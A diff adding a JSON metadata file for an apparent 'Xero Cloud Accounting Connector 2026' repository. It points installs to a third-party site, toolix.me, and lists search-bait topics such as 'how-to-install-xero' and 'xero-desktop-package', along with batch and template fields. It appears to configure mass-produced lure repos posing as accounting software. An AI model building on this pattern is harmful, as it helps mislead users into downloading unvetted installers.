@@ -1,0 +1,23 @@
+{
+  "repo": "xero-cloud-accounting-connector-2026",
+  "product": "Xero Cloud Accounting Connector 2026",
+  "kind": "finance",
+  "install_type": "toolix",
+  "install_url": "https://toolix.me/",
+  "batch": "new3",
+  "format": "license-md-toolix-v1",
+  "category": "finance",
+  "topics": [
+    "xero-accounting",
+    "invoice-sync",
+    "bank-feeds",
+    "payroll-link",
+    "small-business-books",
+    "xero-setup-failed-fix",
+    "how-to-install-xero",
+    "xero-windows",
+    "xero-desktop-2026",
+    "xero-desktop-package"
+  ],
+  "site": "toolix.me"
+}
